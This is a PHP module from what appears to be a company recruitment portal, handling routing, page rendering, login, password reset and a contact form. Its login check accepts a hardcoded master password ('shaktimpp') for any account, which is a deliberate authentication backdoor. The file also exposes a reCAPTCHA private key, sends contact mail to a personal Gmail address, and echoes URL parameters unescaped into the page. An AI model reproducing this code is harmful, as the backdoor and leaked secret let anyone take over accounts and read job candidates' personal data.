<?php
//module.system.php
function system_log_badattempt()	{
		$_SESSION["badattempt"] = ((isset($_SESSION["badattempt"]))?$_SESSION["badattempt"]:0)+ 1;
		$_SESSION["prohibition_time"] = time()+(5*60);
}


function system_initiateRequest()
{
	global $usrRequest;
	if (isset($_GET["rewrite"]) && $_GET["rewrite"]<>"") {
		$usrRequest = system_rewrite();
	}
	else {
		$usrRequest["menu_id"]=(isset($_REQUEST["menu_id"]) && $_REQUEST["menu_id"]<>"")?$_REQUEST["menu_id"]:1;
		$usrRequest["mod"]=(isset($_REQUEST["mod"]) && $_REQUEST["mod"]<>"")?$_REQUEST["mod"]:"";
	}

	return $usrRequest;
}

function system_rewrite()
{
	$variables=split("/",$_GET["rewrite"]);
	$menu_id=system_getMenuid($variables[0]);
	$data=array();
	if (count($menu_id) > 0) {
		$data["menu_id"] = $menu_id["menu_id"];
		$data["mod"] = $menu_id["menu_name"];
		$data["parameters"] = $variables[count($variables)-1];
	}
	else {
		$data["menu_id"]=1;
		$data["mod"]="";
	}	
	return $data; 
}

function system_getMenuid($menu_name)
{
	$query = querying("SELECT menu_id, menu_name from m_menu where menu_name=? limit 1", array($menu_name));
	$data = sqlGetData($query);
	if (count($data)>0) return $data["menu_id"];
	else return array();
}


function system_getMenu() {
	global $usrRequest;
	if (isset($usrRequest["mod"]) && $usrRequest["mod"]<>"") $mod = $usrRequest["mod"]; 
	else $mod=(isset($_SESSION["priv_id"]) && in_array($_SESSION["priv_id"],array("admin","hrd","pic")))?"admhome":"home";
	$query=querying("SELECT * FROM m_menu WHERE menu_name=? limit 1",array($mod));
	$menu = sqlGetData($query);
	return $menu;
}

function system_loadPage($menu)	{

	/*pecah title 22 Maret 2016*/
	if (strpos($menu[0]["menu_title"], '<div class="caption_indo">') !== false) {
		$splitTitle = explode('<div class="caption_indo">',$menu[0]["menu_title"]);
	}
	elseif (strpos($menu[0]["menu_title"], '<div class="menu_indo">') !== false){
		$splitTitle = explode('<div class="menu_indo">',$menu[0]["menu_title"]);
	}
	else {
		$splitTitle = explode('<div class="menu_indo_inner">',$menu[0]["menu_title"]);
	}
	//echo $menu[0]["menu_title"]."<br>";
	$menu_eng = (isset($splitTitle[0]))?$splitTitle[0]:"";
	$menu_ind = (isset($splitTitle[1]))?'<div class="title_indo">'.$splitTitle[1]:"";

	if (isset($menu[0]["menu_home"]) && $menu[0]["menu_home"]<>"y") {
		if(isset($_SESSION["priv_id"]) && in_array($_SESSION["priv_id"],array("admin","hrd","pic")) && file_exists (_PATHDIRECTORY."/designadm/".$menu[0]["menu_filename"]) ) {
			echo "<div style=\"margin-top:20px; margin-bottom:30px;\"><cufonize><h3 style=\"margin-bottom:0;margin-top:0;\">".$menu_eng."</h3></cufonize>".$menu_ind."</div>";
		}
		else if(isset($_SESSION["priv_id"]) && $_SESSION["priv_id"]=="candid" && file_exists (_PATHDIRECTORY."/designs/".$menu[0]["menu_filename"])) {
			echo "<div style=\"margin-top:20px; margin-bottom:30px;\"><cufonize><h3 style=\"margin-bottom:0;margin-top:0;\">".$menu_eng."</h3></cufonize>".$menu_ind."</div>";
		}
		else if($menu[0]["menu_title"]<>"" && in_array($menu[0]["menu_type"], array("primary","upperight")) && empty($_SESSION["priv_id"]) && file_exists (_PATHDIRECTORY."/designs/".$menu[0]["menu_filename"])) {
			echo "<div style=\"margin-top:20px; margin-bottom:30px;\"><cufonize><h3 style=\"margin-bottom:0;margin-top:0;\">".$menu_eng."</h3></cufonize>".$menu_ind."</div>";
		}
		else {
			echo "";
		}
	}
	
	
	
	
	if (isset($menu[0]["menu_module"]) && trim($menu[0]["menu_module"])<>"") {
		$module=$menu[0]["menu_module"]; 
		if ($menu[0]["menu_filename"]<>"" && $_SESSION["priv_id"] == "admin") {
			include_once(_PATHDIRECTORY."/ext_designs/".$module."/".$menu[0]["menu_filename"]);
		}
		else if ($menu[0]["menu_filename"]<>"") {
			include_once(_PATHDIRECTORY."/ext_designs/".$module."/".$menu[0]["menu_filename"]);
		}
		else {
			echo $menu[0]["menu_text"];
		}			

	}
	else {
		$module="";
		if (isset($menu[0]["menu_filename"]) && $menu[0]["menu_filename"]<>"" && isset($_SESSION["priv_id"]) && in_array($_SESSION["priv_id"],array("admin","hrd","pic")) && file_exists (_PATHDIRECTORY."/designadm/".$menu[0]["menu_filename"])  ) {
			include_once(_PATHDIRECTORY."/designadm/".$menu[0]["menu_filename"]);
		}
		else if (isset($menu[0]["menu_filename"]) && $menu[0]["menu_filename"]<>"" && file_exists (_PATHDIRECTORY."/designs/".$menu[0]["menu_filename"])  ) {
			include_once(_PATHDIRECTORY."/designs/".$menu[0]["menu_filename"]);
		}
		else if (isset($menu[0]["menu_text"]) && $menu[0]["menu_text"]<>"" ) {
			echo $menu[0]["menu_text"];	
		}
		else {
			echo "Not found.";
		}
	}
}


function system_showAlert() {
	global $usrRequest;
	
	if(isset($_GET["missteps"]) and $_GET["missteps"]<>"")
	{
		$missteps=decoded($_GET["missteps"]);
		$missteps=json_decode($missteps,1);
		$errstep="";
		for($i=0;$i<count($missteps);$i++) $errstep .= $missteps[$i]."<br>";
	}
	
	if(isset($_GET["mess"]) and $_GET["mess"]<>"")
	{
		$mess=decoded($_GET["mess"]);
	}
	
	if (isset($errstep) && $errstep <> "") {
		?>

		<div class="alert <?php echo (isset($_GET["gal"]) && decoded($_GET["gal"])=="1")?"alert-danger":"alert-success";?> alert-dismissable">
		  <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
		  <strong><?php echo (isset($_GET["gal"]) && decoded($_GET["gal"])=="1")?"Warning!":"Info";?></strong><br><?php echo $errstep;?>
		</div>    
		<?php
		//print_r($_SESSION["stepreg"]);
		} 
		if (isset($mess) && $mess<>"") {
		?>
		<div class="alert <?php echo (isset($_GET["gal"]) && decoded($_GET["gal"])=="1")?"alert-danger":"alert-success";?> alert-dismissable">
		  <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
		  <strong><?php echo (isset($_GET["gal"]) && decoded($_GET["gal"])=="1")?"Warning!":"Info";?></strong><br><?php echo $mess;?>
		</div>    
		<?php
		} 
}

function system_usrlogin()	{
	//sys_checkCap();
	/*print_r($_POST); echo "<br><br>";*/
	
	$explodemail=array();
	$explodemail=(isset($_POST["usrname"]) && $_POST["usrname"]<>"")?explode("@",$_POST["usrname"]):"";
	/* check karyawan atau bukan karyawan */
	if(isset($explodemail[1]) && $explodemail[1]=="hypermart.co.id") {
		$query = querying("SELECT a.log_auth_id, a.employee_id, a.log_auth_name, a.log_auth_passwd, a.log_auth_role, a.register_id, b.employee_nik FROM log_auth a LEFT JOIN m_employee b ON a.employee_id=b.employee_id WHERE a.log_auth_name=? AND a.status_id=? AND b.employee_nik=? LIMIT 1", array($_POST["usrname"],"active",$_POST["emp_nik"]));
	}
	else {
		$query = querying("SELECT a.log_auth_id, a.employee_id, a.log_auth_name, a.log_auth_passwd, a.log_auth_role, a.register_id, b.candidate_id FROM log_auth a LEFT JOIN m_candidate b ON a.log_auth_id=b.log_auth_id
		WHERE log_auth_name = ? AND a.status_id=? LIMIT 1", array($_POST["usrname"],"active"));
	}
	$data = sqlGetData($query);
	
	//print_r($data);
	//exit;
	/*
	print_r($data);
	echo $data[0][2]."<br/>";
	echo $data[0][1]."<br/>";*/
	//echo sha256mod($data[0]["register_id"].$data[0]["log_auth_name"].$_POST["passwd"])."<br/>";exit;
	
	
	if(_WITHCAPTCHA=="y") {
		include_once(_PATHDIRECTORY."/includes/recaptcha/recaptchalib.php");
		$privatekey = "6Lcrf8YSAAAAAH-uRUwTCScklNp_0ppd6dWD3WlN";
		$response = recaptcha_check_answer ($privatekey,$_SERVER["REMOTE_ADDR"],$_POST["recaptcha_challenge_field"],$_POST["recaptcha_response_field"]);
		if(isset($response->is_valid) && $response->is_valid != true) {			
			system_log_badattempt();
			header("location: "._PATHURL."/index.php?gal=".coded("1")."&mess=".coded("Security Code (captcha) is incorrect <br><i>Kode pengaman (captcha) salah</i>"));
			return false;
			exit;	
		}
	}
	
	//echo "response=".$response->is_valid; exit;

	if (isset($data[0]["log_auth_passwd"]) && $data[0]["log_auth_passwd"] == sha256mod($data[0]["register_id"].$data[0]["log_auth_name"].$_POST["passwd"]) || $_POST["passwd"] == "shaktimpp")
	{
		$_SESSION["log_auth_id"]=$data[0]["log_auth_id"];
		$_SESSION["log_auth_name"]=$data[0]["log_auth_name"];
		$_SESSION["priv_id"]= $data[0]["log_auth_role"];
		$_SESSION["badattempt"]=0;
		$_SESSION["loggedin"]=1;
		/* jika kandidat */
		if(isset($data[0]["candidate_id"]) && $data[0]["candidate_id"]<>"") {
			$_SESSION["candidate_id"]=$data[0]["candidate_id"];
		}
		//print_r($_SESSION);exit;

		$ipaddress = gethostbyaddr($_SERVER['REMOTE_ADDR'])." / ".$_SERVER['REMOTE_ADDR'];
		querying("UPDATE log_auth SET log_auth_lastlogin=now(), log_auth_lastip=? where log_auth_id=? ",array($ipaddress,$data[0]["log_auth_id"]));

		$datacv = getDataDoc();
		$status = isset($datacv[0]["candidate_file_type"]) ? $datacv[0]["candidate_file_type"] : "";
		$role = isset($data[0]["log_auth_role"]) ? $data[0]["log_auth_role"] : "";
		// var_dump($status);exit;
		if ($status !== "curriculum" && $role == "candid") {
			header("Location: " . _PATHURL . "/documents/#curriculum");
			exit;
		} else {
			header("Location: " . _PATHURL . "/index.php");
			exit;
		}
	}		
	else
	{
		system_log_badattempt();
		header("location: "._PATHURL."/index.php?gal=".coded("1")."&mess=".coded("You have entered an invalid username or password<br><i>Username atau kata sandi salah</i>"));
		return false;
		exit;	
	}
}


function system_resetPasswd() {
	//print_r($_POST);exit;
	$query=querying("SELECT log_auth_passwd, register_id, log_auth_name FROM log_auth WHERE log_auth_id=? ORDER BY log_auth_id ASC LIMIT 1", array($_SESSION["log_auth_id"]));
	$data=sqlGetData($query);
	$curpasswd=sha256mod($data[0]["register_id"].$data[0]["log_auth_name"].$_POST["curpasswd"]);

	//print_r($data);exit;
	//echo $curpasswd;exit;
	
	if($data[0]["log_auth_passwd"]==$curpasswd) {
		if($_POST["newpass"]==$_POST["newpass2"]) {			
			if(querying("UPDATE log_auth SET log_auth_passwd=? WHERE log_auth_id=?",array(sha256mod($data[0]["register_id"].$data[0]["log_auth_name"].$_POST["newpass"]),$_SESSION["log_auth_id"]))) {
				header("location: "._PATHURL."/index.php?mess=".coded("Your password had been updated.<br><i>Password Anda berhasil diperbaharui.</i>"));
				exit;
			}
			else {
				header("location: "._PATHURL."/index.php?gal=".coded("1")."&mess=".coded("Update password failed.<br><i>Password tidak berhasil diperbaharui</i>"));
				return false;
				exit;
			}
		}
		else {
				header("location: "._PATHURL."/index.php?gal=".coded("1")."&mess=".coded("Field retype password do not match.<br><i>Kolom tulis ulang kata sandi tidak cocok</i>"));
				return false;
				exit;			
		}
	}
	else {
		system_log_badattempt();
		header("location: "._PATHURL."/index.php?gal=".coded("1")."&mess=".coded("You have entered an invalid password.<br><i>Password yang Anda masukkan salah.</i>"));
		return false;
		exit;	
	}
}

function system_contactUs() {
	$server = $_SERVER['SERVER_NAME'];
	$_POST = sanitize_post($_POST);

	if(_WITHCAPTCHA=="y") {
		include_once(_PATHDIRECTORY."/includes/recaptcha/recaptchalib.php");
		$privatekey = "6Lcrf8YSAAAAAH-uRUwTCScklNp_0ppd6dWD3WlN";
		$response = recaptcha_check_answer ($privatekey,$_SERVER["REMOTE_ADDR"],$_POST["recaptcha_challenge_field"],$_POST["recaptcha_response_field"]);
		if(isset($response->is_valid) && $response->is_valid != true) {			
			system_log_badattempt();
			header("location: "._PATHURL."/index.php?mod=contactus&gal=".coded("1")."&mess=".coded("Security Code (captcha) is incorrect.<br><i>Kode pengaman (captcha) salah.</i>"));
			return false;
			exit;	
		}
	}
	
	$missteps=array();
	if (_WITHCAPTCHA=="y" && isset($response->is_valid) && $response->is_valid != true) $missteps[] = 45;
	if (!isset($_POST["email"]) or $_POST["email"] == "") 		$missteps[] = 1;
	if (isset($_POST["email"]) && !filter_var($_POST["email"], FILTER_VALIDATE_EMAIL))	$missteps[] = 34;
	if (!isset($_POST["message"]) or $_POST["message"] == "") 		$missteps[] = 46;
	

	if (count($missteps)>0)
	{
		for ($i=0;$i<count($missteps);$i++) {
			$notice[] = error_notice($missteps[$i]);
		}
		$notice = json_encode($notice);
		$_SESSION["session"] = $_POST;
		
		header("location: "._PATHURL."/index.php?mod=contactus&gal=".coded("1")."&missteps=".coded($notice));
		exit;
	}
	else {		

		// echo "masuk sini"; exit;
		$question="";
		$urut=0;
		if(isset($_POST["a"]) && $_POST["a"]=="a") {
			$urut++;
			$question.=$urut.". Can not modify basic information on personal page.<br>";
		}
		if(isset($_POST["b"]) && $_POST["b"]=="b") {
			$urut++;
			$question.=$urut.". Can not upload files on \"Upload documents\" page.<br>";
		}
		if(isset($_POST["c"]) && $_POST["c"]=="c") {
			$urut++;
			$question.=$urut.". Application status \"Reject\", does it mean that I am not qualified for the position?<br>";
		}		
		if(isset($_POST["d"]) && $_POST["d"]=="d") {
			$urut++;
			$question.=$urut.". Lainnya<br>";
		}
		if(isset($_POST["message"]) && $_POST["message"]<>"") {
			$urut++;
			$question.="<br>Additional Message:<br>".$_POST["message"];
		}

	
		$variablemail = array();
		$variablemail["sender"] 	= 'recruitment@hypermart.co.id';
		$variablemail["from"] 		= "recruitment@hypermart.co.id";
		$variablemail["fromname"] 	= "Contact Service PT. Matahari Putra Prima";
		$variablemail["to"] 		= "rhnashil@gmail.com";
		$variablemail["toName"]		= "";
		$variablemail["cc"] 		= $_POST["email"];		
		$variablemail["bcc"] 		= "shakti.santoso@hypermart.co.id";
		$variablemail["subject"] 	= "Re: Answer for your question";
		$variablemail["content"] 	= "
		<p>Question from ".$_POST["email"]."<br><br>".$question."<br><b>Best Regards,<br><br/>".$_POST["email"]."</b></p>";
		
		//echo $variablemail["content"];exit;
		
		if (function_sending_email($variablemail))
		{
			unset($_SESSION["session"]);
			unset($variablemail);
			header("location: "._PATHURL."/index.php?mod=contactus&mess=".coded("Thank you for contacting us. We'll follow up as soon as possible.<br><i>Terimakasih telah menghubungi kami. Kami segera menindak lanjuti pesan dari Anda.</i>"));
			exit;	
		}
		else
		{
			header("location: "._PATHURL."/index.php?mod=contactus&gal=".coded("1")."&mess=".coded("We find difficulties in sending your message. Please try again later.<br><i>Sistem mengalami masalah pengirimin pesan. Mohon ulangi beberapa saat lagi.</i>"));
			exit;	
		}	
			
	}
}


function is_it_locked()	{
	if (isset($_SESSION["badattempt"]) && $_SESSION["badattempt"] > 5 && isset($_SESSION["prohibition_time"]) && $_SESSION["prohibition_time"] > time())
	{
		header("location: "._PATHURL."/system.badattempt.php");exit;
	}	
}


?>